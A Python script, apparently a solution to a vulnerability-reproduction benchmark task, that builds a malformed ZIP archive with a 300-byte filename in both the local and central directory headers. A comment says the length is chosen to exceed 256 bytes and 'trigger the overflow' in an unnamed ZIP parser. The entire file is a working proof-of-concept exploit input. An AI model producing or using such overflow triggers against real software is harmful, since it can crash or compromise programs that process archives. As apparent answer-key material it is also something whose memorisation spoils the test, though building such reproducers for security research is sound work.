import struct
import sys


class Solution:
    def solve(self, src_path: str) -> bytes:
        name_len = 300  # >256 to trigger the overflow
        filename = b"A" * name_len

        # Local file header
        local_header = struct.pack(
            "<IHHHHHIIIHH",
            0x04034B50,  # signature 'PK\x03\x04'
            20,          # version needed to extract
            0,           # general purpose bit flag
            0,           # compression method (store)
            0,           # last mod file time
            0,           # last mod file date
            0,           # crc32
            0,           # compressed size
            0,           # uncompressed size
            name_len,    # file name length
            0,           # extra field length
        )
        local = local_header + filename  # no extra field, no file data

        offset_local = 0  # local header starts at beginning of file

        # Central directory header
        central_header = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            0x02014B50,  # signature 'PK\x01\x02'
            20,          # version made by
            20,          # version needed to extract
            0,           # general purpose bit flag
            0,           # compression method
            0,           # last mod file time
            0,           # last mod file date
            0,           # crc32
            0,           # compressed size
            0,           # uncompressed size
            name_len,    # file name length
            0,           # extra field length
            0,           # file comment length
            0,           # disk number start
            0,           # internal file attributes
            0,           # external file attributes
            offset_local # relative offset of local header
        )
        central_dir = central_header + filename

        central_dir_offset = len(local)
        central_dir_size = len(central_dir)

        # End of central directory record
        eocd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,        # signature 'PK\x05\x06'
            0,                 # number of this disk
            0,                 # disk where central directory starts
            1,                 # number of central dir records on this disk
            1,                 # total number of central dir records
            central_dir_size,  # size of central directory
            central_dir_offset,# offset of start of central directory
            0,                 # .ZIP file comment length
        )

        return local + central_dir + eocd


if __name__ == "__main__":
    path = sys.argv[1] if len(sys.argv) > 1 else ""
    sys.stdout.buffer.write(Solution().solve(path))
